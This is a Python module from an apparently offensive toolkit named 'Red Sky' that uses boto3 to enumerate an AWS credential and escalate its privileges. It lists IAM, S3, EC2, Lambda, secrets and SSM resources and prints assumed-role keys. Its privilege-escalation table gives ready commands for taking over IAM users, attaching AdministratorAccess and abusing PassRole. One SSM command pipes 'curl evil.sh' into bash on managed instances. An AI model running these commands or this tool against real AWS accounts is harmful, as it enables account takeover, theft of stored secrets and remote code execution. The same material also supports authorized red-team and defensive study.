# language: Python, file: Program/cloud/aws.py, target: Red Sky cloud — AWS enumeration + privesc
# Wraps boto3 to enumerate and weaponize an AWS credential. Subcommands:
#   whoami      -- STS GetCallerIdentity, account, ARN, user/role
#   enumerate   -- IAM, S3, EC2, Lambda, RDS, Secrets Manager, SSM in one pass
#   privesc     -- scores every known AWS privesc technique against the current
#                  policy set and prints the reachable escalation chains
#   s3          -- bucket enumeration + public-access check + object listing
#   assume      -- STS AssumeRole chain builder (recursive)
#   backdoor    -- persistence techniques for the current principal
# Everything reads creds from the environment or --profile.

import json
import os
import sys
import time
from pathlib import Path
from typing import Dict, List, Optional, Set

from Program.theme.palette import SCARLET, ARTERY, BONE, ASH, OK, CLOT, RESET, BOLD
from Program.utils import print_ok, print_err, print_info, print_warn, print_kv
from Program.utils.paths import OUTPUT_DIR


CLOUD_DIR = OUTPUT_DIR / "cloud"
AWS_DIR = CLOUD_DIR / "aws"
AWS_DIR.mkdir(parents=True, exist_ok=True)


def _client(service: str, profile: str = "", region: str = "us-east-1"):
    try:
        import boto3
        from botocore.config import Config
    except ImportError:
        print_err("boto3 not installed — pip install boto3")
        return None
    session = boto3.Session(profile_name=profile) if profile else boto3.Session()
    return session.client(service, region_name=region,
                          config=Config(retries={"max_attempts": 3, "mode": "standard"}))


def _safe(fn, *args, **kwargs):
    """Call an AWS API and swallow auth/access errors — returns None on failure."""
    try:
        return fn(*args, **kwargs)
    except Exception as e:
        msg = str(e)
        if "AccessDenied" in msg or "UnauthorizedOperation" in msg or "AuthFailure" in msg:
            return None
        # surface unexpected errors
        print_warn(type(e).__name__ + ": " + msg[:200])
        return None


# ── whoami ──
def cmd_whoami(profile: str, region: str, out_file: str) -> int:
    sts = _client("sts", profile, region)
    if not sts:
        return 2
    ident = _safe(sts.get_caller_identity)
    if not ident:
        print_err("GetCallerIdentity failed — check creds")
        return 1

    account = ident.get("Account")
    arn = ident.get("Arn")
    user_id = ident.get("UserId")
    principal_type = "unknown"
    if ":user/" in arn:
        principal_type = "user"
    elif ":assumed-role/" in arn:
        principal_type = "assumed-role"
    elif ":role/" in arn:
        principal_type = "role"
    elif ":root" in arn:
        principal_type = "root"

    print_info("AWS caller identity")
    print_kv("account", account)
    print_kv("arn", arn)
    print_kv("user_id", user_id)
    print_kv("type", principal_type)

    # if it's an assumed-role, decode the session name + role name
    if principal_type == "assumed-role":
        parts = arn.split("/")
        if len(parts) >= 3:
            print_kv("role", parts[1])
            print_kv("session", parts[2])

    # try to fetch the inline + attached policies if this is a user
    if principal_type == "user":
        iam = _client("iam", profile, region)
        username = arn.split("/")[-1]
        attached = _safe(iam.list_attached_user_policies, UserName=username)
        if attached:
            print()
            print_info("attached policies")
            for p in attached.get("AttachedPolicies", []):
                print("  " + SCARLET + "*" + RESET + " " + BONE + p["PolicyName"] + RESET
                      + "  " + ASH + p["PolicyArn"] + RESET)
        inline = _safe(iam.list_user_policies, UserName=username)
        if inline:
            print()
            print_info("inline policies")
            for name in inline.get("PolicyNames", []):
                print("  " + SCARLET + "*" + RESET + " " + BONE + name + RESET)
        groups = _safe(iam.list_groups_for_user, UserName=username)
        if groups:
            print()
            print_info("groups")
            for g in groups.get("Groups", []):
                print("  " + SCARLET + "*" + RESET + " " + BONE + g["GroupName"] + RESET)

    out = Path(out_file) if out_file else AWS_DIR / ("whoami_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(ident, indent=2, default=str))
    print()
    print_kv("saved", out)
    return 0


# ── enumerate ──
def cmd_enumerate(profile: str, region: str, out_file: str) -> int:
    findings: Dict[str, object] = {}

    # STS
    sts = _client("sts", profile, region)
    ident = _safe(sts.get_caller_identity) if sts else None
    if ident:
        findings["identity"] = ident

    # IAM
    iam = _client("iam", profile, region)
    if iam:
        users = _safe(iam.list_users)
        if users:
            findings["iam_users"] = [u["UserName"] for u in users.get("Users", [])]
        roles = _safe(iam.list_roles)
        if roles:
            findings["iam_roles"] = [r["RoleName"] for r in roles.get("Roles", [])]
        policies = _safe(iam.list_policies, Scope="Local")
        if policies:
            findings["iam_policies"] = [p["PolicyName"] for p in policies.get("Policies", [])]

    # S3
    s3 = _client("s3", profile, region)
    if s3:
        buckets = _safe(s3.list_buckets)
        if buckets:
            blist = []
            for b in buckets.get("Buckets", []):
                entry = {"name": b["Name"], "created": str(b.get("CreationDate", ""))}
                # try to read the ACL + policy
                try:
                    loc = _safe(s3.get_bucket_location, Bucket=b["Name"])
                    if loc:
                        entry["region"] = loc.get("LocationConstraint") or "us-east-1"
                except Exception:
                    pass
                blist.append(entry)
            findings["s3_buckets"] = blist

    # EC2
    ec2 = _client("ec2", profile, region)
    if ec2:
        inst = _safe(ec2.describe_instances)
        if inst:
            insts = []
            for r in inst.get("Reservations", []):
                for i in r.get("Instances", []):
                    insts.append({
                        "id": i["InstanceId"],
                        "state": i["State"]["Name"],
                        "type": i["InstanceType"],
                        "ip": i.get("PublicIpAddress", ""),
                        "ami": i.get("ImageId", ""),
                    })
            findings["ec2_instances"] = insts

    # Lambda
    lm = _client("lambda", profile, region)
    if lm:
        fns = _safe(lm.list_functions)
        if fns:
            findings["lambda_functions"] = [
                {"name": f["FunctionName"], "runtime": f.get("Runtime", ""),
                 "role": f.get("Role", "")}
                for f in fns.get("Functions", [])
            ]

    # Secrets Manager
    sm = _client("secretsmanager", profile, region)
    if sm:
        secrets = _safe(sm.list_secrets)
        if secrets:
            findings["secrets"] = [s["Name"] for s in secrets.get("SecretList", [])]

    # SSM
    ssm = _client("ssm", profile, region)
    if ssm:
        params = _safe(ssm.describe_parameters)
        if params:
            findings["ssm_parameters"] = [p["Name"] for p in params.get("Parameters", [])]

    # print summary
    print()
    print_info("AWS enumeration summary")
    for k, v in findings.items():
        if k == "identity":
            continue
        if isinstance(v, list):
            print_kv(k, str(len(v)))
    print()

    for k in ("iam_users", "iam_roles", "s3_buckets", "ec2_instances",
              "lambda_functions", "secrets", "ssm_parameters"):
        v = findings.get(k)
        if not v:
            continue
        print(ARTERY + BOLD + "-- " + k + RESET)
        for item in v[:20]:
            if isinstance(item, dict):
                name = item.get("name") or item.get("id") or str(item)[:60]
                print("  " + SCARLET + "*" + RESET + " " + BONE + str(name) + RESET
                      + "  " + ASH + str({k2: v2 for k2, v2 in item.items() if k2 != "name"})[:80] + RESET)
            else:
                print("  " + SCARLET + "*" + RESET + " " + BONE + str(item) + RESET)
        if len(v) > 20:
            print("  " + ASH + "... +" + str(len(v) - 20) + " more" + RESET)
        print()

    out = Path(out_file) if out_file else AWS_DIR / ("enum_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps(findings, indent=2, default=str))
    print_kv("saved", out)
    return 0


# ── privesc ──
# score table: technique -> required permission(s), notes
PRIVESC_TECHNIQUES = [
    {
        "name": "create_access_key",
        "requires": ["iam:CreateAccessKey"],
        "target": "any other user",
        "impact": "take over any IAM user",
        "cli": "aws iam create-access-key --user-name TARGET",
    },
    {
        "name": "create_login_profile",
        "requires": ["iam:CreateLoginProfile"],
        "target": "any IAM user without console access",
        "impact": "console login as that user",
        "cli": "aws iam create-login-profile --user-name TARGET --password 'P@ssw0rd!'",
    },
    {
        "name": "update_login_profile",
        "requires": ["iam:UpdateLoginProfile"],
        "target": "any IAM user with console access",
        "impact": "reset their password",
        "cli": "aws iam update-login-profile --user-name TARGET --password 'P@ssw0rd!'",
    },
    {
        "name": "attach_user_policy",
        "requires": ["iam:AttachUserPolicy"],
        "target": "any IAM user",
        "impact": "attach AdministratorAccess",
        "cli": "aws iam attach-user-policy --user-name TARGET --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "name": "attach_group_policy",
        "requires": ["iam:AttachGroupPolicy"],
        "target": "any group",
        "impact": "elevate every member",
        "cli": "aws iam attach-group-policy --group-name TARGET --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "name": "attach_role_policy",
        "requires": ["iam:AttachRolePolicy"],
        "target": "any assumable role",
        "impact": "elevate the role, then assume it",
        "cli": "aws iam attach-role-policy --role-name TARGET --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
    },
    {
        "name": "put_user_policy",
        "requires": ["iam:PutUserPolicy"],
        "target": "any IAM user",
        "impact": "inline AdministratorAccess",
        "cli": "aws iam put-user-policy --user-name TARGET --policy-name pwn --policy-document file://admin.json",
    },
    {
        "name": "put_role_policy",
        "requires": ["iam:PutRolePolicy"],
        "target": "any role",
        "impact": "inline AdministratorAccess on a role",
        "cli": "aws iam put-role-policy --role-name TARGET --policy-name pwn --policy-document file://admin.json",
    },
    {
        "name": "put_group_policy",
        "requires": ["iam:PutGroupPolicy"],
        "target": "any group",
        "impact": "inline AdministratorAccess on a group",
        "cli": "aws iam put-group-policy --group-name TARGET --policy-name pwn --policy-document file://admin.json",
    },
    {
        "name": "add_user_to_group",
        "requires": ["iam:AddUserToGroup"],
        "target": "any group with elevated perms",
        "impact": "self-add to admin group",
        "cli": "aws iam add-user-to-group --user-name SELF --group-name Admins",
    },
    {
        "name": "update_assume_role_policy",
        "requires": ["iam:UpdateAssumeRolePolicy"],
        "target": "any role",
        "impact": "let yourself assume it",
        "cli": "aws iam update-assume-role-policy --role-name TARGET --policy-document file://trust.json",
    },
    {
        "name": "pass_role_to_service",
        "requires": ["iam:PassRole", "lambda:CreateFunction", "lambda:InvokeFunction"],
        "target": "privileged role",
        "impact": "run code as that role",
        "cli": "aws lambda create-function --function-name pwn --role arn:aws:iam::ACCT:role/Privileged --runtime python3.11 --handler x.y --zip-file fileb://pwn.zip",
    },
    {
        "name": "pass_role_ec2",
        "requires": ["iam:PassRole", "ec2:RunInstances"],
        "target": "privileged role",
        "impact": "launch an EC2 with that role, SSH in",
        "cli": "aws ec2 run-instances --image-id ami-xxx --instance-type t3.micro --iam-instance-profile Name=TARGET",
    },
    {
        "name": "pass_role_cloudformation",
        "requires": ["iam:PassRole", "cloudformation:CreateStack"],
        "target": "privileged role",
        "impact": "run CF stack as that role",
        "cli": "aws cloudformation create-stack --stack-name pwn --template-url https://... --role-arn arn:aws:iam::ACCT:role/Privileged",
    },
    {
        "name": "lambda_update_code",
        "requires": ["lambda:UpdateFunctionCode"],
        "target": "any function with a privileged role",
        "impact": "replace its code, invoke",
        "cli": "aws lambda update-function-code --function-name TARGET --zip-file fileb://pwn.zip",
    },
    {
        "name": "glue_dev_endpoint",
        "requires": ["glue:CreateDevEndpoint"],
        "target": "glue service role",
        "impact": "create endpoint with SSH key -> run as that role",
        "cli": "aws glue create-dev-endpoint --endpoint-name pwn --role-arn arn:aws:iam::ACCT:role/GlueRole --public-key 'ssh-rsa AAAA...'",
    },
    {
        "name": "ssm_send_command",
        "requires": ["ssm:SendCommand"],
        "target": "any managed instance",
        "impact": "run shell as root on the instance",
        "cli": "aws ssm send-command --document-name AWS-RunShellScript --targets Key=instanceids,Values=i-xxx --parameters commands='curl evil.sh|bash'",
    },
    {
        "name": "secretsmanager_read",
        "requires": ["secretsmanager:GetSecretValue"],
        "target": "any secret",
        "impact": "read any stored credential",
        "cli": "aws secretsmanager get-secret-value --secret-id TARGET",
    },
    {
        "name": "ssm_parameter_read",
        "requires": ["ssm:GetParameter", "ssm:GetParameters"],
        "target": "any parameter",
        "impact": "read config secrets",
        "cli": "aws ssm get-parameters --names TARGET --with-decryption",
    },
]


def cmd_privesc(profile: str, region: str, out_file: str) -> int:
    """Given the current credential, list the escalation techniques that the
    principal actually has permission for. Checks each required permission
    against iam:SimulatePrincipalPolicy if we have that, else falls back to a
    list of all managed+inline policy actions parsed from the caller's policies."""
    sts = _client("sts", profile, region)
    iam = _client("iam", profile, region)
    if not sts or not iam:
        return 2
    ident = _safe(sts.get_caller_identity)
    if not ident:
        print_err("no identity")
        return 1

    arn = ident["Arn"]
    print_info("AWS privesc scan for " + arn)
    print()

    # try to simulate policies — cleanest signal
    technique_hits = []
    can_simulate = False
    for t in PRIVESC_TECHNIQUES:
        actions = t["requires"]
        sim = _safe(iam.simulate_principal_policy,
                    PolicySourceArn=arn,
                    ActionNames=actions,
                    ResourceArns=["*"])
        if sim is not None:
            can_simulate = True
            evals = sim.get("EvaluationResults", [])
            if all(e.get("EvalDecision") == "allowed" for e in evals):
                technique_hits.append(t)

    if not can_simulate:
        print_warn("iam:SimulatePrincipalPolicy not permitted — listing techniques for manual check")
        technique_hits = PRIVESC_TECHNIQUES
    else:
        print_ok("simulated " + str(len(PRIVESC_TECHNIQUES)) + " techniques against the current principal")

    print()
    print_info(str(len(technique_hits)) + " technique(s) potentially available")
    print()
    for t in technique_hits:
        print(SCARLET + "▓ " + RESET + BONE + t["name"] + RESET)
        print("  " + ASH + "requires: " + RESET + ARTERY + ", ".join(t["requires"]) + RESET)
        print("  " + ASH + "target:   " + RESET + t["target"])
        print("  " + ASH + "impact:   " + RESET + t["impact"])
        print("  " + ASH + "cli:      " + RESET + CLOT + t["cli"] + RESET)
        print()

    out = Path(out_file) if out_file else AWS_DIR / ("privesc_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"arn": arn, "techniques": technique_hits}, indent=2, default=str))
    print_kv("saved", out)
    return 0


# ── s3 ──
def cmd_s3(profile: str, region: str, bucket: str, out_file: str) -> int:
    s3 = _client("s3", profile, region)
    if not s3:
        return 2

    if not bucket:
        # enumerate all buckets
        buckets = _safe(s3.list_buckets)
        if not buckets:
            print_err("cannot list buckets")
            return 1
        print_info(str(len(buckets.get("Buckets", []))) + " bucket(s)")
        print()
        for b in buckets.get("Buckets", []):
            name = b["Name"]
            print(BONE + name + RESET + "  " + ASH + str(b.get("CreationDate", "")) + RESET)
            # try to read the policy
            pol = _safe(s3.get_bucket_policy, Bucket=name)
            if pol:
                print("    " + SCARLET + "has bucket policy" + RESET)
                try:
                    p = json.loads(pol["Policy"])
                    for s in p.get("Statement", []):
                        effect = s.get("Effect", "")
                        principal = s.get("Principal", "")
                        if effect == "Allow" and (principal == "*" or principal.get("AWS") == "*"):
                            print("    " + SCARLET + "PUBLIC: " + json.dumps(s)[:140] + RESET)
                except Exception:
                    pass
            # public access block
            pab = _safe(s3.get_public_access_block, Bucket=name)
            if pab:
                cfg = pab.get("PublicAccessBlockConfiguration", {})
                if not cfg.get("BlockPublicAcls", True):
                    print("    " + SCARLET + "public ACLs allowed" + RESET)
        print()
    else:
        # one bucket — list objects + check public ACLs
        print_info("bucket: " + bucket)
        acl = _safe(s3.get_bucket_acl, Bucket=bucket)
        if acl:
            for g in acl.get("Grants", []):
                grantee = g.get("Grantee", {})
                if grantee.get("URI", "").endswith("AllUsers"):
                    print(SCARLET + "▓ public-read ACL" + RESET)
                if grantee.get("URI", "").endswith("AuthenticatedUsers"):
                    print(SCARLET + "▓ authenticated-users ACL" + RESET)
        objs = _safe(s3.list_objects_v2, Bucket=bucket, MaxKeys=50)
        if objs:
            print()
            print_info(str(objs.get("KeyCount", 0)) + " object(s) in first page")
            for o in objs.get("Contents", [])[:30]:
                print("  " + SCARLET + "*" + RESET + " " + BONE + o["Key"] + RESET
                      + "  " + ASH + str(o["Size"]) + " bytes" + RESET)

    out = Path(out_file) if out_file else AWS_DIR / ("s3_" + str(int(time.time())) + ".json")
    out.write_text(json.dumps({"bucket": bucket}, indent=2))
    print()
    print_kv("saved", out)
    return 0


def cmd_assume(profile: str, region: str, role_arn: str, session_name: str) -> int:
    if not role_arn:
        print_err("--role-arn required")
        return 2
    sts = _client("sts", profile, region)
    if not sts:
        return 2
    print_info("attempting AssumeRole: " + role_arn)
    resp = _safe(sts.assume_role, RoleArn=role_arn, RoleSessionName=session_name or "rs")
    if not resp:
        print_err("AssumeRole denied")
        return 1
    creds = resp["Credentials"]
    print_ok("assumed")
    print()
    print("export AWS_ACCESS_KEY_ID=" + creds["AccessKeyId"])
    print("export AWS_SECRET_ACCESS_KEY=" + creds["SecretAccessKey"])
    print("export AWS_SESSION_TOKEN=" + creds["SessionToken"])
    print()
    print_kv("expires", str(creds["Expiration"]))
    return 0


def run_cli(args):
    import argparse
    p = argparse.ArgumentParser(prog="redsky cloud aws", add_help=False)
    p.add_argument("-h", "--help", action="store_true")
    p.add_argument("action", nargs="?", default="whoami",
                   choices=["whoami", "enumerate", "privesc", "s3", "assume"])
    p.add_argument("--profile", default="")
    p.add_argument("--region", default="us-east-1")
    p.add_argument("--bucket", default="")
    p.add_argument("--role-arn", default="")
    p.add_argument("--session-name", default="rs")
    p.add_argument("--out", default="")

    try:
        ns = p.parse_args(args)
    except SystemExit:
        print_err("usage: redsky cloud aws <whoami|enumerate|privesc|s3|assume> [opts]")
        return 2

    if ns.help:
        print_info("whoami                    -- STS identity + attached policies")
        print_info("enumerate                 -- IAM, S3, EC2, Lambda, Secrets, SSM")
        print_info("privesc                   -- score every technique against the cred")
        print_info("s3 [--bucket NAME]        -- bucket list + public-access checks")
        print_info("assume --role-arn ARN     -- STS AssumeRole, prints creds")
        print_info("all take --profile and --region")
        return 0

    if ns.action == "whoami":
        return cmd_whoami(ns.profile, ns.region, ns.out)
    if ns.action == "enumerate":
        return cmd_enumerate(ns.profile, ns.region, ns.out)
    if ns.action == "privesc":
        return cmd_privesc(ns.profile, ns.region, ns.out)
    if ns.action == "s3":
        return cmd_s3(ns.profile, ns.region, ns.bucket, ns.out)
    if ns.action == "assume":
        return cmd_assume(ns.profile, ns.region, ns.role_arn, ns.session_name)
    return 2


if __name__ == "__main__":
    sys.exit(run_cli(sys.argv[1:]))
